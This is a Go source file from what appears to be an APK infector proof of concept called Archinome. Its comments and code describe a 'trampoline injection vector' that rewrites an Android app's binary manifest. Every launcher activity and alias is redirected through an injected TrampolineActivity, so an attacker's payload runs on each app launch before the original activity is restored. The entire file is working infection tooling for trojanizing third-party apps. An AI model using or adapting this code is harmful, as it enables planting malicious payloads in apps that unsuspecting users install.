package manifest

// Trampoline (entry-activity substitution) injection vector.
//
// Redirects EVERY MAIN/LAUNCHER component (both <activity> and
// <activity-alias>) through aaaaaaaaaaaa.TrampolineActivity. Each redirected
// component carries a <meta-data android:name="archinome.target"
// android:value="<original class>"/> child, so the trampoline can resolve the
// original entry class from its own resolved ActivityInfo (getComponentName()
// returns the alias when launched via one) and relaunch it. The original entry
// class(es) are re-declared as non-launcher <activity> elements (with their
// original attributes preserved) so they stay declared and startable.
//
// Runtime flow: launcher icon -> (activity or alias) -> TrampolineActivity
// .onCreate -> payload -> startActivity(original) -> finish(). The payload
// therefore runs on every cold launch of the app via any of its launcher icons,
// without touching android:name on <application> or any class in the original
// dex.
//
// The patch is pure binary AXML surgery (same approach as PatchProvider):
//   1. append strings (trampoline class, "meta-data", "archinome.target", each
//      original target FQN, "activity-alias" when needed) to the string pool
//   2. ensure the "value" (0x01010024) and "targetActivity" (0x01010202)
//      attribute resource ids are in the resource map ("name" 0x01010003 is
//      always present)
//   3. rename each launcher component's entry attribute (android:name for
//      <activity>, android:targetActivity for <activity-alias>) to the
//      trampoline class; a second+ distinct launcher <activity> is converted to
//      an <activity-alias> instead (two <activity> elements may not share a
//      name)
//   4. insert <meta-data>...</meta-data> as the first child of each component
//   5. insert a non-launcher <activity android:name="<original>"/> (original
//      attributes preserved) after <application>
//   6. fix the AXML total size

import (
	"encoding/binary"
	"log"
	"os"
	"sort"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

const (
	trampolineClassName = "aaaaaaaaaaaa.TrampolineActivity"
	metaDataTagStr      = "meta-data"
	metaDataKey         = "archinome.target"
	activityAliasStr    = "activity-alias"
	aliasNameSuffix     = "ArchinomeAlias"

	resIDValue          = 0x01010024
	resIDTargetActivity = 0x01010202

	actionMainStr       = "android.intent.action.MAIN"
	categoryLauncherStr = "android.intent.category.LAUNCHER"
)

// ------------------------------------------------------------- element parsing

type xmlAttr struct {
	off      int
	ns       uint32
	name     uint32 // resource-map index, or string index if >= len(resIds)
	rawValue uint32
	dataType uint8
	data     uint32
}

type xmlElem struct {
	nameIdx  uint32
	startOff int
	endOff   int // just past matching end tag
}

// elementAttrs returns the attributes of the tag-start chunk at off.
func elementAttrs(data []byte, off int) []xmlAttr {
	attrStart := int(leU16(data, off+24))
	attrSize := int(leU16(data, off+26))
	attrCount := int(leU16(data, off+28))
	base := off + 16 + attrStart
	attrs := make([]xmlAttr, attrCount)
	for i := 0; i < attrCount; i++ {
		a := base + i*attrSize
		attrs[i] = xmlAttr{a, leU32(data, a), leU32(data, a+4), leU32(data, a+8), data[a+15], leU32(data, a+16)}
	}
	return attrs
}

// findAttrByResID returns the attribute whose name resolves to resID.
func findAttrByResID(data []byte, off int, resIds []uint32, resID uint32) (xmlAttr, bool) {
	for _, a := range elementAttrs(data, off) {
		if int(a.name) < len(resIds) && resIds[a.name] == resID {
			return a, true
		}
	}
	return xmlAttr{}, false
}

func attrStringValue(pool *stringPool, data []byte, a xmlAttr) string {
	if a.dataType == 0x03 {
		return pool.decode(data, int(a.data))
	}
	return pool.decode(data, int(a.rawValue))
}

// skipElement returns the offset just past the matching end tag of the
// tag-start chunk at off.
func skipElement(data []byte, off int) int {
	size := int(leU32(data, off+4))
	cursor := off + size
	for cursor+8 <= len(data) {
		t := leU16(data, cursor)
		sz := int(leU32(data, cursor+4))
		if sz < 8 || cursor+sz > len(data) {
			return len(data)
		}
		if t == chunkTagEnd {
			return cursor + sz
		}
		if t == chunkTagStart {
			cursor = skipElement(data, cursor)
		} else {
			cursor += sz
		}
	}
	return len(data)
}

// childElements returns the direct child elements of the tag-start at off.
func childElements(data []byte, off int) []xmlElem {
	var out []xmlElem
	size := int(leU32(data, off+4))
	cursor := off + size
	for cursor+8 <= len(data) {
		t := leU16(data, cursor)
		sz := int(leU32(data, cursor+4))
		if sz < 8 || cursor+sz > len(data) {
			break
		}
		if t == chunkTagEnd {
			break
		}
		if t == chunkTagStart {
			out = append(out, xmlElem{nameIdx: leU32(data, cursor+20), startOff: cursor, endOff: skipElement(data, cursor)})
			cursor = out[len(out)-1].endOff
		} else {
			cursor += sz
		}
	}
	return out
}

func elementName(pool *stringPool, data []byte, e xmlElem) string {
	return pool.decode(data, int(e.nameIdx))
}

// firstTagStart returns the offset of the first tag-start chunk (the <manifest>
// root).
func firstTagStart(data []byte) int {
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		sz := int(leU32(data, off+4))
		if sz < 8 || off+sz > len(data) {
			break
		}
		if t == chunkTagStart {
			return off
		}
		off += sz
	}
	return -1
}

// hasLauncherFilter reports whether the component tag at off contains an
// <intent-filter> with a MAIN action and a LAUNCHER category.
func hasLauncherFilter(data []byte, pool *stringPool, resIds []uint32, off int) bool {
	for _, child := range childElements(data, off) {
		if elementName(pool, data, child) != "intent-filter" {
			continue
		}
		hasMain, hasLauncher := false, false
		for _, ifc := range childElements(data, child.startOff) {
			tag := elementName(pool, data, ifc)
			a, ok := findAttrByResID(data, ifc.startOff, resIds, resIDName)
			if !ok {
				continue
			}
			val := attrStringValue(pool, data, a)
			if tag == "action" && val == actionMainStr {
				hasMain = true
			}
			if tag == "category" && val == categoryLauncherStr {
				hasLauncher = true
			}
		}
		if hasMain && hasLauncher {
			return true
		}
	}
	return false
}

// launcherComponent describes one MAIN/LAUNCHER component under <application>.
type launcherComponent struct {
	startOff   int
	isActivity bool
	entryAttr  xmlAttr // android:name (activity) or android:targetActivity (alias)
	origTarget string  // resolved FQN of the original entry class
}

// findLauncherComponents returns every <activity> and <activity-alias> under
// <application> that carries a MAIN/LAUNCHER intent-filter. entryAttr is the
// attribute to rename so the component routes through the trampoline.
func findLauncherComponents(data []byte, pool *stringPool, resIds []uint32, pkg string) []launcherComponent {
	root := firstTagStart(data)
	if root < 0 {
		return nil
	}
	var appOff = -1
	for _, c := range childElements(data, root) {
		if elementName(pool, data, c) == "application" {
			appOff = c.startOff
			break
		}
	}
	if appOff < 0 {
		return nil
	}

	var out []launcherComponent
	for _, c := range childElements(data, appOff) {
		name := elementName(pool, data, c)
		if name != "activity" && name != "activity-alias" {
			continue
		}
		if !hasLauncherFilter(data, pool, resIds, c.startOff) {
			continue
		}
		lc := launcherComponent{startOff: c.startOff, isActivity: name == "activity"}
		if lc.isActivity {
			a, ok := findAttrByResID(data, c.startOff, resIds, resIDName)
			if !ok {
				continue
			}
			lc.entryAttr = a
			lc.origTarget = resolveClassName(pkg, attrStringValue(pool, data, a))
		} else {
			a, ok := findAttrByResID(data, c.startOff, resIds, resIDTargetActivity)
			if !ok {
				continue
			}
			lc.entryAttr = a
			lc.origTarget = resolveClassName(pkg, attrStringValue(pool, data, a))
		}
		out = append(out, lc)
	}
	return out
}

func resolveClassName(pkg, name string) string {
	if strings.HasPrefix(name, ".") {
		return pkg + name
	}
	if !strings.Contains(name, ".") {
		return pkg + "." + name
	}
	return name
}

// copyAttrsExceptName returns the attributes of the tag at off as elemAttr,
// dropping the android:name attribute.
func copyAttrsExceptName(data []byte, off int, resIds []uint32) []elemAttr {
	var out []elemAttr
	for _, a := range elementAttrs(data, off) {
		if int(a.name) < len(resIds) && resIds[a.name] == resIDName {
			continue
		}
		out = append(out, elemAttr{a.ns, a.name, a.rawValue, a.dataType, a.data})
	}
	return out
}

// ------------------------------------------------------------- chunk builders

type elemAttr struct {
	ns       uint32
	nameIdx  uint32 // resource-map index
	rawIdx   uint32
	dataType uint8
	data     uint32
}

func buildStartTag(tagStrIdx uint32, attrs []elemAttr) []byte {
	n := len(attrs)
	size := uint32(36 + n*20)
	b := make([]byte, size)
	binary.LittleEndian.PutUint16(b[0:], chunkTagStart)
	binary.LittleEndian.PutUint16(b[2:], 0x10)
	binary.LittleEndian.PutUint32(b[4:], size)
	binary.LittleEndian.PutUint32(b[8:], 0)          // lineNumber
	binary.LittleEndian.PutUint32(b[12:], 0xFFFFFFFF) // comment
	binary.LittleEndian.PutUint32(b[16:], 0xFFFFFFFF) // ns
	binary.LittleEndian.PutUint32(b[20:], tagStrIdx)  // element name
	binary.LittleEndian.PutUint16(b[24:], 20)         // attributeStart
	binary.LittleEndian.PutUint16(b[26:], 20)         // attributeSize
	binary.LittleEndian.PutUint16(b[28:], uint16(n))  // attributeCount
	binary.LittleEndian.PutUint16(b[30:], 0)          // idIndex
	binary.LittleEndian.PutUint16(b[32:], 0)          // classIndex
	binary.LittleEndian.PutUint16(b[34:], 0)          // styleIndex
	for i, a := range attrs {
		putAttr(b, 36+i*20, a.ns, a.nameIdx, a.rawIdx, a.dataType, a.data)
	}
	return b
}

func buildEndTag(tagStrIdx uint32) []byte {
	b := make([]byte, 24)
	binary.LittleEndian.PutUint16(b[0:], chunkTagEnd)
	binary.LittleEndian.PutUint16(b[2:], 0x10)
	binary.LittleEndian.PutUint32(b[4:], 24)
	binary.LittleEndian.PutUint32(b[8:], 0)          // lineNumber
	binary.LittleEndian.PutUint32(b[12:], 0xFFFFFFFF) // comment
	binary.LittleEndian.PutUint32(b[16:], 0xFFFFFFFF) // ns
	binary.LittleEndian.PutUint32(b[20:], tagStrIdx)  // element name
	return b
}

// ------------------------------------------------------------- entry point

// PatchTrampoline performs the trampoline patch on the already-dumped binary
// manifest (utils.ManifestBinaryPath) and rewrites it in place.
func PatchTrampoline() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)

	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}

	pkg := getPackageName()
	if pkg == "" {
		log.Panic("package name not found")
	}

	// resource map
	resMapOff := findChunk(data, chunkResMap)
	if resMapOff < 0 {
		log.Panic("resource map chunk not found")
	}
	resMapSizeOrig := int(leU32(data, resMapOff+4))
	resMapHdr := int(leU16(data, resMapOff+2))
	resMapCount := (resMapSizeOrig - resMapHdr) / 4
	resIds := make([]uint32, resMapCount)
	for i := 0; i < resMapCount; i++ {
		resIds[i] = leU32(data, resMapOff+8+i*4)
	}
	nameResIdx := indexOfU32(resIds, resIDName)
	if nameResIdx < 0 {
		log.Panic("'name' attribute resource id not found in resource map")
	}
	valueResIdx := indexOfU32(resIds, resIDValue)
	targetResIdx := indexOfU32(resIds, resIDTargetActivity)
	var newResIDBytes []byte
	nextIdx := len(resIds)
	if valueResIdx < 0 {
		valueResIdx = nextIdx
		nextIdx++
		newResIDBytes = append(newResIDBytes, u32bytes(resIDValue)...)
	}
	if targetResIdx < 0 {
		targetResIdx = nextIdx
		nextIdx++
		newResIDBytes = append(newResIDBytes, u32bytes(resIDTargetActivity)...)
	}

	// launcher components
	comps := findLauncherComponents(data, pool, resIds, pkg)
	if len(comps) == 0 {
		log.Panic("no MAIN/LAUNCHER activity or activity-alias found")
	}

	// distinct original targets (FQN), first-seen order
	var targets []string
	seen := map[string]bool{}
	for _, c := range comps {
		if !seen[c.origTarget] {
			seen[c.origTarget] = true
			targets = append(targets, c.origTarget)
		}
	}

	// strings appended at indices stringCount..stringCount+N-1
	var newStrings []string
	addStr := func(s string) uint32 {
		if idx := pool.indexOf(data, s); idx >= 0 {
			return uint32(idx)
		}
		i := uint32(pool.stringCount + len(newStrings))
		newStrings = append(newStrings, s)
		return i
	}
	trampolineClassIdx := addStr(trampolineClassName)
	metaTagIdx := addStr(metaDataTagStr)
	metaKeyIdx := addStr(metaDataKey)
	targetIdx := make(map[string]uint32, len(targets))
	for _, t := range targets {
		targetIdx[t] = addStr(t)
	}

	actTagIdx := pool.indexOf(data, "activity")
	if actTagIdx < 0 {
		log.Panic("'activity' string not found")
	}

	// conversion to <activity-alias> is only needed when there is more than one
	// distinct launcher <activity> (rare); aliases are redirected in place.
	activityCount := 0
	for _, c := range comps {
		if c.isActivity {
			activityCount++
		}
	}
	var activityAliasIdx uint32
	if activityCount > 1 {
		activityAliasIdx = addStr(activityAliasStr)
	}

	// host: the first launcher <activity>, if any
	hostIdx := -1
	for i, c := range comps {
		if c.isActivity {
			hostIdx = i
			break
		}
	}

	// unique alias names for extra launcher activities — computed up front so
	// they land in the string pool before it is encoded below
	extraAliasNameIdx := make(map[int]uint32)
	for i, c := range comps {
		if i == hostIdx || !c.isActivity {
			continue
		}
		extraAliasNameIdx[i] = addStr(c.origTarget + aliasNameSuffix)
	}

	// encode appended strings
	oldDataSize := pool.size - pool.stringsStart
	var newOffsetBytes, newStringBytes []byte
	acc := oldDataSize
	for _, s := range newStrings {
		enc := encodeString(pool.flags, s)
		newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
		newStringBytes = append(newStringBytes, enc...)
		acc += len(enc)
	}
	newStringCount := pool.stringCount + len(newStrings)
	newStringsStart := pool.stringsStart + len(newStrings)*4
	newPoolSize := pool.size + len(newOffsetBytes) + len(newStringBytes)
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}

	// meta-data element builder
	buildMeta := func(valIdx uint32) []byte {
		start := buildStartTag(metaTagIdx, []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), metaKeyIdx, 0x03, metaKeyIdx},
			{uint32(androidNs), uint32(valueResIdx), valIdx, 0x03, valIdx},
		})
		return append(start, buildEndTag(metaTagIdx)...)
	}

	// locate <application> start tag (insertion point for re-declarations)
	appStrIdx := pool.indexOf(data, "application")
	if appStrIdx < 0 {
		log.Panic("'application' string not found")
	}
	appInsertOff := -1
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		sz := int(leU32(data, off+4))
		if sz < 8 || off+sz > len(data) {
			break
		}
		if t == chunkTagStart && int(leU32(data, off+20)) == appStrIdx {
			appInsertOff = off + sz
			break
		}
		off += sz
	}
	if appInsertOff < 0 {
		log.Panic("application start tag not found")
	}

	type edit struct {
		off int
		del int
		val []byte
	}
	var edits []edit

	// --- pool header + appended data ---
	edits = append(edits,
		edit{pool.off + 4, 4, u32bytes(uint32(newPoolSize))},
		edit{pool.off + 8, 4, u32bytes(uint32(newStringCount))},
		edit{pool.off + 20, 4, u32bytes(uint32(newStringsStart))},
		edit{pool.off + 28 + pool.stringCount*4, 0, newOffsetBytes},
		edit{pool.off + pool.size, 0, newStringBytes},
	)

	// --- resource map append ---
	if len(newResIDBytes) > 0 {
		edits = append(edits,
			edit{resMapOff + 4, 4, u32bytes(uint32(resMapSizeOrig + len(newResIDBytes)))},
			edit{resMapOff + resMapSizeOrig, 0, newResIDBytes},
		)
	}

	// --- host component ---
	if hostIdx >= 0 {
		host := comps[hostIdx]
		// rename host activity name -> trampoline
		edits = append(edits,
			edit{host.entryAttr.off + 8, 4, u32bytes(trampolineClassIdx)},
			edit{host.entryAttr.off + 16, 4, u32bytes(trampolineClassIdx)},
		)
		// meta-data as first child
		edits = append(edits, edit{host.startOff + int(leU32(data, host.startOff+4)), 0, buildMeta(targetIdx[host.origTarget])})
	} else {
		// alias-only: create a bare trampoline <activity> (with meta-data) as a
		// top-level application child; the aliases redirect to it.
		newActStart := buildStartTag(uint32(actTagIdx), []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), trampolineClassIdx, 0x03, trampolineClassIdx},
		})
		meta := buildMeta(targetIdx[comps[0].origTarget])
		edits = append(edits, edit{appInsertOff, 0, append(append(newActStart, meta...), buildEndTag(uint32(actTagIdx))...)})
	}

	// --- redirect every other launcher component ---
	// Top-level application inserts (re-declarations) are accumulated here so
	// that multiple inserts at the same offset stay deterministically ordered.
	var appInserts []byte
	for i, c := range comps {
		if i == hostIdx {
			continue
		}
		if c.isActivity {
			// second+ launcher activity: convert to <activity-alias>. The alias
			// takes a UNIQUE name (origTarget + suffix) so it cannot collide
			// with the non-launcher <activity> re-declared for the original
			// class below (a same-name alias+activity pair would loop).
			aliasNameIdx := extraAliasNameIdx[i]
			aliasAttrs := make([]elemAttr, 0, len(elementAttrs(data, c.startOff))+1)
			for _, a := range elementAttrs(data, c.startOff) {
				if int(a.name) < len(resIds) && resIds[a.name] == resIDName {
					a.rawValue = aliasNameIdx
					a.data = aliasNameIdx
				}
				aliasAttrs = append(aliasAttrs, elemAttr{a.ns, a.name, a.rawValue, a.dataType, a.data})
			}
			aliasAttrs = append(aliasAttrs, elemAttr{uint32(androidNs), uint32(targetResIdx), trampolineClassIdx, 0x03, trampolineClassIdx})
			aliasStart := buildStartTag(uint32(activityAliasIdx), aliasAttrs)
			aliasEnd := buildEndTag(uint32(activityAliasIdx))
			startSize := int(leU32(data, c.startOff+4))
			endTagOff := skipElement(data, c.startOff) - 24
			edits = append(edits,
				edit{c.startOff, startSize, aliasStart},
				edit{c.startOff + startSize, 0, buildMeta(targetIdx[c.origTarget])},
				edit{endTagOff, 24, aliasEnd},
			)
		} else {
			// alias: rename android:targetActivity -> trampoline
			edits = append(edits,
				edit{c.entryAttr.off + 8, 4, u32bytes(trampolineClassIdx)},
				edit{c.entryAttr.off + 16, 4, u32bytes(trampolineClassIdx)},
			)
			edits = append(edits, edit{c.startOff + int(leU32(data, c.startOff+4)), 0, buildMeta(targetIdx[c.origTarget])})
		}
	}

	// --- re-declare consumed targets (original launcher activities) as
	// non-launcher <activity> elements, preserving their attributes ---
	for _, c := range comps {
		if !c.isActivity {
			continue
		}
		attrs := copyAttrsExceptName(data, c.startOff, resIds)
		attrs = append([]elemAttr{{uint32(androidNs), uint32(nameResIdx), targetIdx[c.origTarget], 0x03, targetIdx[c.origTarget]}}, attrs...)
		newActStart := buildStartTag(uint32(actTagIdx), attrs)
		newActEnd := buildEndTag(uint32(actTagIdx))
		appInserts = append(appInserts, newActStart...)
		appInserts = append(appInserts, newActEnd...)
	}
	if len(appInserts) > 0 {
		edits = append(edits, edit{appInsertOff, 0, appInserts})
	}

	// --- total size ---
	newTotal := len(data)
	for _, e := range edits {
		newTotal += len(e.val) - e.del
	}
	edits = append(edits, edit{axmlSizeOff, 4, u32bytes(uint32(newTotal))})

	sort.SliceStable(edits, func(i, j int) bool { return edits[i].off < edits[j].off })

	out := make([]byte, 0, newTotal)
	cursor := 0
	for _, e := range edits {
		out = append(out, data[cursor:e.off]...)
		out = append(out, e.val...)
		cursor = e.off + e.del
	}
	out = append(out, data[cursor:]...)

	utils.WriteChanges(out, utils.ManifestBinaryPath)
	log.Printf("Trampoline injected: %d launcher component(s) -> %s, manifest size 0x%x -> 0x%x",
		len(comps), trampolineClassName, len(data), len(out))
}
